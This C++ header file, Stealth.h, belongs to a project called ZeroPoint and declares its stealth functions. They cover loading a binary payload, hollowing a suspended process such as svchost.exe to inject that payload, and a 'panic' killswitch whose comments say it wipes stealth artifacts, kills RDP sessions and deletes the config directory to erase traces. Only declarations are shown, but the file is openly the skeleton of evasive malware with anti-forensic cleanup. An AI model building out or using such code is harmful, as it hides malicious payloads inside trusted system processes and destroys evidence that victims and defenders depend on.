// ============================================================================
//  ZeroPoint — Stealth.h
//  Process hollowing, payload injection, and panic cleanup declarations.
// ============================================================================

#pragma once
#ifndef ZEROPOINT_STEALTH_H
#define ZEROPOINT_STEALTH_H

#include <string>
#include <vector>
#include <windows.h>

// ---------------------------------------------------------------------------
//  Payload I/O
// ---------------------------------------------------------------------------

// Read a binary file into a byte vector. Returns empty on failure.
std::vector<BYTE> ReadPayload(const std::string& path);

// ---------------------------------------------------------------------------
//  Process Hollowing / Ghost Injection
// ---------------------------------------------------------------------------

// Create a suspended process from targetCmd, inject payloadPath into its
// address space, and resume execution. Returns true on success.
bool InjectGhostProcess(const std::string& targetCmd,
                        const std::string& payloadPath);

// High-level wrapper: hollows svchost.exe and injects the ZeroPoint payload.
bool PerformHollowing();

// ---------------------------------------------------------------------------
//  Panic — Killswitch + Trace Wipe
// ---------------------------------------------------------------------------

// Terminate the current process, destroy any stealth artifacts, stop the VE,
// kill RDP sessions, wipe the config directory, and exit immediately.
// Does NOT return.
[[noreturn]] void PanicKillAndWipe();

#endif // ZEROPOINT_STEALTH_H
